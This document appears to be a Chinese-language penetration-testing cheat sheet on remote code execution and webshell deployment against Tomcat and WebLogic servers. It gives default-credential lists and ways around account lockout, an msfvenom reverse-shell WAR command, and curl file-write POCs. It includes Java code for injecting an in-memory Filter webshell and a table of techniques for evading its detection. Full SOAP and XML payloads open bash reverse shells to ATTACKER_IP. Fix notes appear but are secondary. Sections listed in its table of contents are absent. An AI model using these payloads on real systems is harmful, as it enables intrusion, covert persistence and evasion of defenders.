# 常见中间件/服务器 RCE 与 GetShell 实战技巧

> 整理时间: 2026-06-20
> 用途: 授权渗透测试中常见中间件 RCE 速查与利用

---

## 目录

1. [Tomcat](#1-tomcat)
2. [WebLogic](#2-weblogic)
3. [JBoss / WildFly](#3-jboss--wildfly)
4. [Apache 生态](#4-apache-生态)
5. [其他中间件](#5-其他中间件)
6. [FOFA 指纹速查表](#6-fofa-指纹速查表)
7. [通用 GetShell 链总结](#7-通用-getshell-链总结)

---

## 1. Tomcat

### 1.1 Tomcat Manager 弱口令 + WAR 包部署 GetShell

**利用条件:** Tomcat Manager App 对外暴露 + 弱口令/默认口令

**常见弱口令:**
```
tomcat:tomcat
admin:admin
admin:tomcat
root:root
manager:manager
both:tomcat
role1:role1
```

**爆破注意:** Tomcat 6/7/8+ 同一账号登录错误 >5 次后会锁定用户。绕过策略:
- **密码喷洒 (Password Spraying)**: 用一个密码去爆破多个用户名
- **Burp Custom Iterator + Base64**: 构造 `username:password` 后 Base64 编码

**GetShell 流程:**
```bash
# 1. 制作 WAR 包
jar -cvf shell.war shell.jsp

# 2. 或使用 msfvenom 生成反向 Shell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f war -o shell.war

# 3. 登录 Manager App: http://target:8080/manager/html
# 4. 在 "WAR file to deploy" 区域上传 shell.war -> Deploy
# 5. 访问 Webshell: http://target:8080/shell/shell.jsp
```

**绕过路径技巧 (部署时路径分隔符):**
- `../` 路径穿越部署到 ROOT 或其他应用
- 分号 `;` 在某些版本可绕过认证

### 1.2 CVE-2017-12615 — PUT 方法任意文件写

| 项目 | 详情 |
|------|------|
| **CVE** | CVE-2017-12615 |
| **影响版本** | Tomcat 7.0.0 - 7.0.79 (Windows) |
| **修复版本** | 7.0.82+ |
| **利用条件** | `DefaultServlet` 的 `readonly=false` + PUT 方法启用 |
| **CVSS** | 9.8 |

**原理:** Tomcat 的 `DefaultServlet` 在 `readonly=false` 时支持 PUT 方法写入文件。虽然直接 PUT `.jsp` 被拦截，但可通过附加路径分隔符绕过。

**POC:**
```bash
# Linux 绕过 — 末尾加 /
curl -X PUT "http://target:8080/shell.jsp/" -d '<% out.println("RCE OK"); %>'

# Windows 绕过 — ::$DATA 流
curl -X PUT "http://target:8080/shell.jsp::$DATA" -d '<% out.println("RCE OK"); %>'

# 触发 RCE
curl "http://target:8080/shell.jsp"
```

**Nuclei 检测:** `cves/2017/CVE-2017-12615.yaml`

### 1.3 CVE-2020-1938 (GhostCat) — AJP 文件读取->RCE

| 项目 | 详情 |
|------|------|
| **CVE** | CVE-2020-1938 (CNVD-2020-10487) |
| **影响版本** | Tomcat 6.x / 7.x < 7.0.100 / 8.x < 8.5.51 / 9.x < 9.0.31 |
| **利用条件** | AJP Connector 启用 (默认 8009 端口), 无需认证 |
| **CVSS** | 9.8 |

**原理:** AJP 协议处理器对 `javax.servlet.include.path_info` 等属性未做充分验证，可通过路径穿越读取任意文件。如果应用允许文件上传，可配合实现 RCE。

**POC (文件读取):**
```bash
python2 CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml target_ip
```
**敏感文件:** `/WEB-INF/web.xml`, `/WEB-INF/classes/db.properties`

**RCE 利用链 (配合文件上传):**
1. 向可上传接口上传包含 JSP 代码的 txt/jpg 文件
2. 通过 GhostCat 的 AJP 文件包含将上传文件作为 JSP 执行

**修复方案:**
- 升级 Tomcat 至安全版本 (9.0.31+ / 8.5.51+ / 7.0.100+)
- 或注释掉 `server.xml` 中 `<Connector port="8009" protocol="AJP/1.3".../>`
- 或添加 `secretRequired="true"` 和 `secret="xxx"`

**公开工具:** `abrewer251/CVE-2020-1938_Ghostcat-PoC`, `projectdiscovery/nuclei-templates`

### 1.4 CVE-2019-0232 — CGI Servlet RCE

| 项目 | 详情 |
|------|------|
| **CVE** | CVE-2019-0232 |
| **影响版本** | Tomcat 7.x < 7.0.94 / 8.5.x < 8.5.40 / 9.x < 9.0.19 |
| **利用条件** | Windows 平台 + CGI Servlet 显式启用 + `enableCmdLineArguments=true` |
| **CVSS** | 7.2 |

**原理:** Windows 下 JRE 将命令行参数传递给 `cmd.exe` 时的处理缺陷，当 `enableCmdLineArguments` 启用时，URL 参数会作为命令行参数传递给 CGI 脚本，可注入额外命令。

**利用条件苛刻 (缺一不可):**
1. 运行在 Windows 操作系统
2. CGI Servlet 被显式启用 (默认禁用)
3. `enableCmdLineArguments=true` (Tomcat 9.0.x 起默认禁用)
4. 存在可调用的 .bat/.cmd CGI 脚本

**Metasploit:** `exploit/windows/http/tomcat_cgi_cmdlineargs`
**公开 POC:** `bloodstiller/CVE-2019-0232`

### 1.5 Tomcat Session 反序列化

| 项目 | 详情 |
|------|------|
| **类型** | 反序列化 RCE |
| **影响** | 使用基于文件的 Session 持久化 (`PersistentManager` + `FileStore`) |

**原理:** Tomcat 的 `PersistentManager` 在 Session 过期或被钝化时会将 Session 对象序列化写入 `work/Catalina/localhost/<app>/` 目录下的 `.session` 文件。如果攻击者能够向该目录写入恶意序列化 `.session` 文件 (如通过文件上传+路径穿越)，则在 Tomcat 反序列化该 Session 时可触发 RCE。

**关键文件路径:**
```
<TOMCAT_HOME>/work/Catalina/localhost/<context_path>/<session_id>.session
```

**利用前提:**
1. 应用启用了 `PersistentManager` (非 Tomcat 默认 `StandardManager`)
2. 或能通过其他漏洞向 session 目录写入文件
3. 目标 classpath 中存在可利用的 gadget 链 (如 commons-collections)

**利用工具:** ysoserial -> 生成恶意序列化 session 文件; 配合任意文件写入/上传漏洞投递

### 1.6 Tomcat 内存马注入

**概述:** 内存马是无文件落地的高级 Webshell 技术，直接注入到 Tomcat 的 JVM 内存中，不落盘，传统杀软/文件扫描无法检测。

**四大组件型内存马:**

| 类型 | 注入位置 | 隐蔽性 | 持久性 |
|------|----------|--------|--------|
| **Filter 型** | `StandardContext.filterDefs` + `filterMaps` | 高 | 应用重启消失 |
| **Servlet 型** | `StandardContext.children` | 中 | 应用重启消失 |
| **Listener 型** | `StandardContext.applicationEventListenersList` | 高 | 应用重启消失 |
| **Valve 型** | Pipeline/Valve 管道 | 极高 | 应用重启消失 |

**Agent 型内存马 (最高级):**
- 利用 Java Instrumentation 的 `agentmain` 动态挂载
- 直接修改 `ApplicationFilterChain.doFilter()` 字节码
- 不新增任何组件，容器级遍历无法发现

**Filter 内存马注入三板斧:**
```java
// Step 1: 获取 StandardContext
WebappClassLoaderBase -> StandardRoot.context -> StandardContext

// Step 2: 构造并注册 FilterDef
FilterDef filterDef = new FilterDef();
filterDef.setFilter(new EvilFilter());
standardContext.addFilterDef(filterDef);

// Step 3: 构造 FilterMap 插入 filterMaps 头部
FilterMap filterMap = new FilterMap();
filterMap.setFilterName("evilFilter");
filterMap.addURLPattern("/*");
standardContext.addFilterMap(filterMap);

// Step 4: 激活
standardContext.filterStart();
```

**常见注入入口:** 反序列化漏洞 / JNDI 注入 / Spring SpEL/OGNL / Shiro RememberMe / 文件上传+URLClassLoader

**检测与绕过:**
| 检测手段 | 绕过技术 |
|---------|---------|
| 检查磁盘 .class 文件 | 字节码直接 defineClass, 不落盘 |
| 类名关键字匹配 (evil/shell) | 类名随机化/Lambda化 |
| 字节码特征 (Runtime.exec) | 加密通信 (AES/冰蝎协议) |
| Filter 链遍历审计 | 伪装合法组件 (如篡改 WsFilter) |
| 反射行为监控 | 利用 CVE 获取 Context, 避免反射 |

**关键工具:** JYso, ShiroExploit, marshalsec

---

## 2. WebLogic

### 2.1 CVE-2017-3506 / CVE-2017-10271 — wls-wsat XMLDecoder 反序列化

| 项目 | 详情 |
|------|------|
| **CVE** | CVE-2017-3506 -> CVE-2017-10271 (绕过) |
| **影响版本** | 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2 |
| **利用条件** | 无需认证, wls-wsat 组件存在 |
| **CVSS** | 9.8 |

**原理:** WebLogic WLS Security 组件的 `WorkContextXmlInputAdapter` 使用 `java.beans.XMLDecoder` 解析 XML 数据，未对反序列化类做有效过滤。

**受影响端点 (全部 11 个):**
```
/wls-wsat/CoordinatorPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/RegistrationRequesterPortType11
/_async/AsyncResponseService
/_async/AsyncResponseServiceJms
/_async/AsyncResponseServiceHttps
```

**补丁绕过演进:**
```
CVE-2017-3506 (原始)  -> 黑名单 <object> 标签
CVE-2017-10271 (绕过) -> 改用 <void>/<array> 标签
CVE-2019-2725 (绕过) -> 改用 <class> 标签 + UnitOfWorkChangeSet
CVE-2019-2729 (绕过) -> 改用 <array method="forName"> (需 JDK 1.6)
```

**CVE-2017-10271 POC (反弹 Shell):**
```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: target:7001
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.4.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

**公开工具:** `Dungsocool/CVE-2017-10271`, `5l1v3r1/CVE-2017-10274` (Python + MSF)

**修复方案:** 删除 `wls-wsat.war` 和 `wls9_async_response.war` 并重启, 或升级至最新 CPU 补丁

### 2.2 CVE-2023-21839 / CVE-2024-20931 / CVE-2024-21182 — T3/IIOP JNDI 注入

| 项目 | 详情 |
|------|------|
| **CVE 链** | CVE-2023-21839 -> CVE-2024-20931 (绕过) -> CVE-2024-21182 (再绕过) |
| **影响版本** | 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |
| **利用条件** | T3/IIOP 端口 (默认 7001) 可达, 无需认证 |
| **CVSS** | 9.8 |

**原理:** 通过 T3/IIOP 协议向 WebLogic 的 JNDI 注册表 `rebind()` 恶意 `ForeignOpaqueReference` 对象，当 `context.lookup()` 触发时，服务器自身发起 JNDI 查询到攻击者的恶意 LDAP/RMI 服务 -> JNDI 注入 -> RCE。

**补丁绕过核心:**
- **CVE-2023-21839**: 利用 `ForeignOpaqueReference` 触发 JNDI 注入
- **CVE-2024-20931**: 绕过 Oracle 对 `ForeignOpaqueReference` 的黑名单过滤
- **CVE-2024-21182**: 改用 `AggregatableOpaqueReference` 替代, 列入 CISA KEV

**重要 JDK 依赖:**
- JDK < 8u191: `trustURLCodebase=true` -> 直接 RCE
- JDK >= 8u191: `trustURLCodebase=false` -> JNDI 注入仍可 SSRF, RCE 需 classpath 中已有 gadget

**典型利用流程:**
```bash
# Step 1: 在 VPS 启动 JNDI 恶意服务
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <attacker_ip>

# Step 2: 监听反弹 Shell
nc -lvp 9999

# Step 3: 发送利用请求
java -jar Weblogic-CVE-2023-21839.jar <target>:7001 \
  ldap://<attacker_ip>:1389/Basic/ReverseShell/<attacker_ip>/9999

# 或使用 Go 版本 (跨平台)
./CVE-2023-21839 -ip <target> -port 7001 \
  -ldap ldap://<attacker_ip>:1389/evil
```

**公开工具:**
- `4ra1n/CVE-2023-21839` (Go)
- `DXask88MA/Weblogic-CVE-2023-21839` (Java)
- `dinosn/CVE-2024-21182` (Docker 复现环境)
- `abcheroworld/CVE-2024-20931` (绕过 POC)

### 2.3 CVE-2020-14882 / CVE-2020-14883 — 未授权 Console RCE

| 项目 | 详情 |
|------|------|
| **CVE** | CVE-2020-14882 (权限绕过) + CVE-2020-14883 (代码执行) |
| **影响版本** | 10.3.6.0, 12.1.3.0, 12.2.1.3, 12.2.1.4, 14.1.1.0 |
| **利用条件** | Console 组件对外暴露, 无需认证 |
| **CVSS** | 9.8 |

**原理:**
- **CVE-2020-14882**: WebLogic `web.xml` 对 `/css/*` `/images/*` 等静态资源路径无认证约束。通过**二次URL编码**的路径穿越 (`%252E%252E%252F` -> `../`) 访问原本需要认证的 `console.portal`
- **CVE-2020-14883**: Netuix 框架的 `HandleFactory.getHandle()` 对 `handle` 参数做反射实例化时未限制，导致任意代码执行

**POC — 权限绕过验证:**
```http
GET /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
```
返回后台页面 -> 存在权限绕过

**POC — 命令执行 (12.2.1+):**
```http
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success');") HTTP/1.1
```

**POC — 远程 XML 加载 (全版本通用):**
```http
POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://ATTACKER_IP/rce.xml")
```

**恶意 rce.xml (反弹 Shell):**
```xml
<beans xmlns="http://www.springframework.org/schema/beans"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://www.springframework.org/schema/beans
  http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>/bin/bash</value>
        <value>-c</value>
        <value><![CDATA[bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

**带回显 POC (by @77ca1k1k1):** 添加 `cmd: whoami` 头部，利用长反射代码获取请求/响应对象回显结果

**绕过补丁:** Oracle 初次修复使用黑名单过滤路径，但被 `%252e%252e` 绕过 -> 产生 **CVE-2020-14750**

### 2.4 CVE-2018-3191 — T3 反序列化 (Spring JNDI)

| 项目 | 详情 |
|------|------|
| **CVE** | CVE-2018-3191 |
| **影响版本** | 10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3 |
| **利用条件** | T3 端口可达 (7001), 无需认证 |
| **CVSS** | 9.8 |

**原理:** Oracle 未将 `AbstractPlatformTransactionManager` 类加入反序列化黑名单，攻击者利用 `JtaTransactionManager` 进行 JNDI 注入。

**检测:** `nmap -n -v -Pn -sV --script=weblogic-t3-info.nse target -p7001,7002`

**POC 参考:** `mackleadmire/CVE-2018-3191-Rce-Exploit`

**同期 T3 漏洞 (2018 年 10 月 CPU, 全部 9.8 分):**
CVE-2018-3191, CVE-2018-3197, CVE-2018-3201, CVE-2018-3245, CVE-2018-3252

### 2.5 CVE-2014-4210 — SSRF (UDDI Explorer)

| 项目 | 详情 |
|------|------|
| **CVE** | CVE-2014-4210 |
| **类型** | SSRF (非反序列化 RCE) |
| **影响版本** | WebLogic 10.0.2 - 10.3.6 |
| **利用条件** | uddiexplorer 组件存在, 无需认证 |

**漏洞位置:** `http://target:7001/uddiexplorer/SearchPublicRegistries.jsp`
参数 `operator` 接收任意 URL，WebLogic 服务器会发起 HTTP 请求。

**内网端口探测:** 端口开放返回 404, 端口关闭返回 could not connect

**内网 Redis 攻击 (CRLF 注入):** 通过 `%0D%0A` 注入 Redis 命令 -> 写 crontab 反弹 Shell

**公开 POC:** `unmanarc/CVE-2014-4210-SSRF-PORTSCANNER-POC`

### 2.6 WebLogic 其他重要漏洞速查

| CVE | 类型 | 年份 | 说明 |
|-----|------|------|------|
| **CVE-2016-0638** | T3 反序列化 | 2016 | T3 协议 Java 反序列化 |
| **CVE-2016-3510** | T3 + CC链 | 2016 | Commons Collections gadget |
| **CVE-2017-3248** | T3 反序列化 | 2017 | T3 协议处理器 |
| **CVE-2018-2628** | T3 反序列化 | 2018 | 绕过 CVE-2017-3248 补丁 |
| **CVE-2018-2893** | JMS 反序列化 | 2018 | JMS 协议 |
| **CVE-2020-2883** | T3 反序列化 | 2020 | 后续 T3 漏洞 |
| **CVE-2020-14750** | Console 绕过 | 2020 | 绕过 CVE-2020-14882 补丁 |

### 2.7 WebLogic 通用防御措施

1. **删除危险组件**: 删除 `wls-wsat.war`, `wls9_async_response.war`, `uddiexplorer.war`
2. **禁用 T3/IIOP**: 配置 `weblogic.security.net.ConnectionFilterImpl` 过滤 T3 协议
3. **限制 Console 访问**: 仅允许管理 IP 访问 `/console`
4. **升级 JDK**: 至 8u191+ / 11.0.1+ 禁用 `trustURLCodebase`
5. **及时打补丁**: 关注 Oracle 每季度 CPU 更新
